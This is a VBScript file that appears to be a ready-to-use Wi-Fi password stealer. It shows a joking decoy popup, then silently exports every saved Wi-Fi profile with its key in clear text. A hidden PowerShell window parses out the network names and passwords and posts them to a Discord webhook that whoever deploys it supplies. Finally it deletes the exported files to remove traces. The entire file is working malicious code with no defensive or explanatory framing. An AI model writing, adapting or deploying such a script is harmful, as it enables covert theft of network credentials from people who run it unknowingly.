' === Create Shell object ===
Set shell = CreateObject("WScript.Shell")

' === Show popup message ===
MsgBox "Hey there! Thanks for clicking me :)", vbInformation, "LOL"

' === Export Wi-Fi profiles with passwords ===
shell.Run "cmd /c netsh wlan export profile key=clear", 0, True
WScript.Sleep 2000

' === Discord Webhook URL ===
webhook = "ENTER YOUR DISCORD WEBHOOK URL"

' === PowerShell Command as multiline string ===
psCmd = ""
psCmd = psCmd & "$profiles = Get-ChildItem -Path . -Filter 'Wi-Fi*.xml';"
psCmd = psCmd & "$data = @();"
psCmd = psCmd & "foreach ($file in $profiles) {"
psCmd = psCmd & " $xml = [xml](Get-Content $file.FullName);"
psCmd = psCmd & " $ssid = $xml.WLANProfile.SSIDConfig.SSID.name;"
psCmd = psCmd & " $pass = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial;"
psCmd = psCmd & " $data += [PSCustomObject]@{SSID=$ssid;Password=$pass} };"
psCmd = psCmd & "$output = '```' + [Environment]::NewLine;"
psCmd = psCmd & "$output += 'SSID'.PadRight(25) + 'Password' + [Environment]::NewLine;"
psCmd = psCmd & "$output += '-' * 50 + [Environment]::NewLine;"
psCmd = psCmd & "foreach ($item in $data) {"
psCmd = psCmd & " $output += $item.SSID.PadRight(25) + $item.Password + [Environment]::NewLine };"
psCmd = psCmd & "$output += '```';"
psCmd = psCmd & "$body = @{content=$output} | ConvertTo-Json;"
psCmd = psCmd & "Invoke-RestMethod -Uri '" & webhook & "' -Method POST -Body $body -ContentType 'application/json';"
psCmd = psCmd & "Remove-Item 'Wi-Fi*.xml' -Force;"

' === Run PowerShell silently ===
finalCmd = "powershell -WindowStyle Hidden -Command " & Chr(34) & psCmd & Chr(34)
shell.Run finalCmd, 0, True
